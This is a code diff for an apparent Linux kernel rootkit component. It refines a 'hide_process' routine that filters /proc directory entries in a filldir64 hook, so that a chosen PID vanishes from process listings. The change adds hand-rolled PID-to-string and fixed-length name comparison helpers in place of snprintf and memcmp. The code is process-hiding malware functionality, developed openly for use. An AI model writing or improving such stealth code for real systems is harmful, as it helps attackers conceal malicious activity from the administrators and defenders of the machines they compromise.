@@ -50,6 +50,42 @@ static bool hide_process_has_pid(void)
     return false;
 }
 
+static int hide_process_pid_to_str(pid_t pid, char *out, int out_size)
+{
+    char tmp[16];
+    unsigned int value;
+    int len = 0;
+    int i;
+
+    if (!out || out_size <= 1 || pid <= 0)
+        return 0;
+
+    value = (unsigned int)pid;
+    do
+    {
+        tmp[len++] = '0' + (value % 10);
+        value /= 10;
+    } while (value && len < sizeof(tmp));
+
+    if (len >= out_size)
+        return 0;
+
+    for (i = 0; i < len; i++)
+        out[i] = tmp[len - 1 - i];
+    out[len] = '\0';
+    return len;
+}
+
+static bool hide_process_name_equal(const char *name, const char *pid_str, int namlen)
+{
+    int i;
+
+    for (i = 0; i < namlen; i++)
+        if (name[i] != pid_str[i])
+            return false;
+    return true;
+}
+
 // filldir64 没有 struct file 参数，无法确认当前目录是否为 /proc；这里用 DT_DIR + 精确 PID 名字匹配。
 static bool hide_process_match_pid_name(const char *name, int namlen, unsigned int d_type)
 {
@@ -67,8 +103,8 @@ static bool hide_process_match_pid_name(const char *name, int namlen, unsigned i
             continue;
 
         // name 不是 NUL 结尾字符串，必须按 namlen 做定长比较。
-        pid_len = snprintf(pid_str, sizeof(pid_str), "%d", hidden_pid);
-        if (pid_len == namlen && __builtin_memcmp(name, pid_str, namlen) == 0)
+        pid_len = hide_process_pid_to_str(hidden_pid, pid_str, sizeof(pid_str));
+        if (pid_len == namlen && hide_process_name_equal(name, pid_str, namlen))
             return true;
     }
     return false;
